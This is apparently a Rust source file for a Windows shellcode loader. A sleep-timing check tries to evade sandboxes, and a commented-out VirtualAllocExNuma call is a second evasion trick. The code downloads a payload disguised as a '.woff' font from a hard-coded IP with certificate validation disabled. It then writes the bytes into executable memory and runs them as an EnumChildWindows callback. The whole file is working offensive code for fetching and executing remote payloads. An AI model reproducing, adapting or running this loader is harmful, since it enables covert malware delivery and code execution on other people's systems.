use std::thread::sleep;
use std::time::{
    Duration,
    Instant
};
//use core::ffi::c_void;
use windows::Win32::System::Memory::{
    VirtualAlloc,
    //VirtualAllocExNuma,
    VIRTUAL_ALLOCATION_TYPE,
    PAGE_PROTECTION_FLAGS
};
use windows::Win32::UI::WindowsAndMessaging::EnumChildWindows;
use windows::Win32::Foundation::{
    //HANDLE,
    HWND,
    LPARAM,
    BOOL
};
use std::{
    self,
    ptr,
};
use reqwest;

fn countermeasures() {
    let now = Instant::now();
    sleep(Duration::from_secs(5));
    if now.elapsed().as_secs() < 5 {
        return;
    }
    /*
    unsafe {
        let lpaddress: Option<*const c_void> = Some(std::ptr::null());
        VirtualAllocExNuma(
            HANDLE(0),
            lpaddress,
            0x1000,
            VIRTUAL_ALLOCATION_TYPE(0x3000),
            0x4,
            0x0
        );
    }*/
}

fn download_payload() -> Vec<u8> {
    let url = "http://192.168.1.166/http.woff";
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let binary = client.get(url).send().unwrap().bytes().unwrap();
    binary.to_vec()
}

pub fn runner() {
    countermeasures();

    let shellcode = download_payload();

    unsafe {
        let addr = VirtualAlloc(
            Some(ptr::null_mut()),
            shellcode.len().try_into().unwrap(), // Buffer length must fit into a usize
            VIRTUAL_ALLOCATION_TYPE(0x3000),
            PAGE_PROTECTION_FLAGS(0x40)
        );

        std::ptr::copy(shellcode.as_ptr() as _, addr, shellcode.len());
        let exec: extern "system" fn(HWND, LPARAM) -> BOOL = { std::mem::transmute(addr) };

        let _res = EnumChildWindows(
            HWND(0),
            Some(exec),
            LPARAM(0)
        );
    }
}
